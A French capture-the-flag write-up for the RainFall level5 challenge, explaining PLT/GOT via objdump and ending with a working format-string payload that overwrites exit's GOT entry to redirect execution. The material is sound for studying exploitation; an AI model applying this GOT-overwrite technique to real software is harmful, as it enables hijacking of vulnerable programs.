LIVRE: HACKING THE ART OF EXPLOITATION by Hogn ERICKSON v2 (a partir de page 190)

Quand une function est utilise dans une librairie partagee,  c est utilse d'avoir un table ou sont referencees les functions.

Section PLT (procedure limkage table). Cette section consiste a faire pleins de jump, chaque jump correspond a une function. Pour l'afficher :objdump -d -j .plt [FILE]

level5@RainFall:~$ objdump -d -j .plt level5

level5:     file format elf32-i386


Disassembly of section .plt:

08048370 <printf@plt-0x10>:
 8048370:	ff 35 1c 98 04 08    	pushl  0x804981c
 8048376:	ff 25 20 98 04 08    	jmp    *0x8049820
 804837c:	00 00                	add    %al,(%eax)
	...

08048380 <printf@plt>:
 8048380:	ff 25 24 98 04 08    	jmp    *0x8049824
 8048386:	68 00 00 00 00       	push   $0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <_init+0x3c>

08048390 <_exit@plt>:
 8048390:	ff 25 28 98 04 08    	jmp    *0x8049828
 8048396:	68 08 00 00 00       	push   $0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483a0 <fgets@plt>:
 80483a0:	ff 25 2c 98 04 08    	jmp    *0x804982c
 80483a6:	68 10 00 00 00       	push   $0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483b0 <system@plt>:
 80483b0:	ff 25 30 98 04 08    	jmp    *0x8049830
 80483b6:	68 18 00 00 00       	push   $0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483c0 <__gmon_start__@plt>:
 80483c0:	ff 25 34 98 04 08    	jmp    *0x8049834
 80483c6:	68 20 00 00 00       	push   $0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <_init+0x3c>

080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>

080483e0 <__libc_start_main@plt>:
 80483e0:	ff 25 3c 98 04 08    	jmp    *0x804983c
 80483e6:	68 30 00 00 00       	push   $0x30
 80483eb:	e9 80 ff ff ff       	jmp    8048370 <_init+0x3c>


dans exit@plt on peut remarque qu il y a un jump. Mais on ne peut pas la modifier car cette section est en READ. On peut remarquer que le jump est fait a la value de cette adresse et non pas l'adresse avec l'etoile (*). Cette adresse existe dans la section GOT (global offset table). Les entrees de GOT sont fixees pour chaques binaires.Cette section est writable ! BINGO !!!

Pour afficher GOT :objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit              <===============
0804983c R_386_JUMP_SLOT   __libc_start_main


On va ecraser l'offset n exit par une autre addresse, dans ce level on appeler la function o. 0x080484a4


(python -c 'print "%08x."*50') | ./level5
00000200.b7fd1ac0.b7ff37d0.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252..........

On retrouve notre chaine de caractere "x80%"(litle-endian) au 4e offset. On peut aussi a le retrouver en faisant un calcul:
   	0x080484c5 <+3>:	sub    esp,0x218	   
	0x080484dc <+26>:	lea    eax,[ebp-0x208]
	0x218 - 0x208 = 0x10 = 16 = 4 * 4 



r < <(python -c 'print "\x39\x98\x04\x08"+ "\x38\x98\x04\x08" + "A"*124 + "%4$hhn" + "A"*0x20 + "%5$hhn"')
